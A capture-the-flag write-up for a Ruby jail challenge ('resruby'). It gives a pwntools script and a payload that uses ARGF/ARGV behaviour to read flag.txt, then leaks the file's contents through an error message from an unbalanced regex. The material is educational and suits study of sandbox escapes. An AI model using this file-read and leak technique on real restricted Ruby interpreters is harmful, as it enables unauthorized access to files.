# resruby

```py
from pwn import *

p = remote("resruby.challs.csc.tf", 1337)

solve = """
$*.<<(*$<);/#{[*$<]}(/
""".strip()

p.sendlineafter(b"> ", solve.encode())
p.sendafter(b"ok", b"flag.txt")
p.shutdown() # equivalent to ctrl + d

print(p.recvall().decode())
p.close()
```

This solution abuses how accessing `$<` (aka ARGF) with an empty `ARGV` reads from stdin, while accessing `$<` with a non-empty `ARGV` actually opens each file in `ARGV` and reads it.

So to start, we access `$<` using the splat operator (while `ARGV` is empty) and input `flag.txt` (no newline after it). After sending the shutdown/ctrl-d, it will return `["flag.txt"]` which we can then shovel into `$*` (aka ARGV).

From there, we can access `$<` using the splat operator again to get the contents of `flag.txt` returned to us, but we still have to leak the flag. I purposely removed the `<<` from the IO class because with it, you can just do `$><<flag` which is no fun. The trick I used here was interpolating the flag into a regex, and then when ruby tries to compile it, it'll error because of the unmatched parenthesis. The error shows the full regex after interpolation, which will leak the flag to us :)
